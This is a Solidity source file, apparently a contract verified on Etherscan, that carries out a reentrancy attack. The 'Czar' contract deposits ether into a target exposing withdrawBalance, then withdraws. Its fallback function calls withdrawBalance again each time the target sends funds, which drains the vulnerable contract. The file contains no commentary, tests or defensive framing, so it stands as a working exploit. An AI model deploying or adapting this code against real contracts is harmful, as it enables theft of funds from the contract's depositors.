/**
 *Submitted for verification at Etherscan.io on 2022-12-19
*/

pragma solidity ^0.8.0;

abstract contract Mox {
    // INSECURE
    mapping (address => uint) public userBalances;

    function deposit() external virtual payable;

    function totalSupply() external view virtual returns (uint);

    function withdrawBalance() external virtual;

}


contract Czar {
    address public token;
    constructor(address tkn) public {
        token = tkn;
    }

    fallback() external payable{
        if (msg.sender == token &&  Mox(msg.sender).totalSupply() !=0){
            Mox(msg.sender).withdrawBalance();
        }

    }


    function almo() external payable{
        address(token).call{value: msg.value}(abi.encodeWithSignature("deposit()"));


    }

    function xpl() external {
        Mox(token).withdrawBalance();
    }




}